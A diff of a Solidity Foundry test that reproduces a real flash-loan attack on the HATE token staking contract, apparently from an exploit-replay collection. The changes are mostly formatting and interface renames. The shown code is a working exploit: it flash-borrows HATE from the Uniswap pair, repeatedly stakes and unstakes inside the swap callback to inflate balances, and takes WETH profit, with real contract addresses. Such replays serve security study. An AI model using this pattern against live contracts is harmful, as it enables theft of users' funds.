@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~8ETH
 // Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
@@ -38,8 +37,8 @@ contract ContractTest is Test {
 
     IERC20 HATE = IERC20(0x7b768470590B8A0d28fC714d0A70754d556D14eD);
     IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
-    Uni_Pair_V2 HATE_ETH_Pair = Uni_Pair_V2(0x738dab4AF8D21b7aafb73545D79D3B4831eE79dA);
-    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Pair HATE_ETH_Pair = IUniswapV2Pair(0x738dab4AF8D21b7aafb73545D79D3B4831eE79dA);
+    IUniswapV2Router uniRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     Staking HATEStaking = Staking(0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8);
     IsHATE sHATE = IsHATE(0xf829d7014Db17D6DCe448bE958c7e4983cdb1F77);
     uint256 flashAmount;
@@ -57,7 +56,7 @@ contract ContractTest is Test {
         vm.rollFork(18_069_528 - 1);
         approveAll();
         console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
-        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair)) * 9 / 10;
+        flashAmount = (HATE.balanceOf(address(HATE_ETH_Pair)) * 9) / 10;
         HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex"03");
 
         address[] memory path = new address[](2);
@@ -72,7 +71,7 @@ contract ContractTest is Test {
         vm.rollFork(18_071_199 - 1);
         approveAll();
         console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
-        flashAmount = HATE.balanceOf(address(HATE_ETH_Pair)) * 7 / 10;
+        flashAmount = (HATE.balanceOf(address(HATE_ETH_Pair)) * 7) / 10;
         HATE_ETH_Pair.swap(flashAmount, 0, address(this), hex"1e");
 
         address[] memory path = new address[](2);
@@ -83,7 +82,14 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("WETH balance after swap", WETH.balanceOf(address(this)), WETH.decimals());
     }
 
-    function uniswapV2Call(address, /*sender*/ uint256 amount0, uint256, /*amount1*/ bytes calldata data) external {
+    function uniswapV2Call(
+        address,
+        /*sender*/
+        uint256 amount0,
+        uint256,
+        /*amount1*/
+        bytes calldata data
+    ) external {
         uint256 i = 0;
         while (i < uint8(data[0])) {
             uint256 balanceAttacker = HATE.balanceOf(address(this));
@@ -92,7 +98,7 @@ contract ContractTest is Test {
             HATEStaking.unstake(address(this), sTokenBalance, true);
             i += 1;
         }
-        HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);
+        HATE.transfer(address(HATE_ETH_Pair), uint256((amount0 * 1000) / 997) + 1);
     }
 
     function approveAll() internal {
